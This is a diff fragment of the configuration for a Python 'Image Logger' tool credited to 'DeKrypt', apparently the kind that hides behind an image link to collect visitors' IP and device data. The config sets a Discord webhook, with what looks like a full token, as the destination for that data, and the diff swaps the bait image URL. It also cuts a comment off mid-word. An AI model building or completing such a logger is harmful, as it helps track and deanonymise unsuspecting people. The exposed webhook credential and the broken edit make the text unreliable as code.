@@ -13,9 +13,9 @@ __author__ = "DeKrypt"
 config = {
     
     "webhook": "https://discord.com/api/webhooks/1390330273643630693/A0FZvGsQwecby7IU9-1lBAtDijVOYdImszsPaAR-soTDLqcLNGjZ7k-Hi-I2Ba6XnlS2",
-    "image": "https://cdn.discordapp.com/attachments/1390294688279429203/1390331105185366087/Screenshot_2025-07-03-15-52-31-19_572064f74bd5f9fa804b05334aa4f912.jpg?ex=6867de3e&is=68668cbe&hm=0e2046a0c8f5b7d849f511d9b210bff5e4f34955eec680ed1da1f390feb6119d&", # You can also have a custom image by using a URL argument
+    "image": "https://res.cloudinary.com/zenbusiness/q_auto,w_1050/v1670445040/logaster/logaster-2013-06-jpg.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE R
 
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
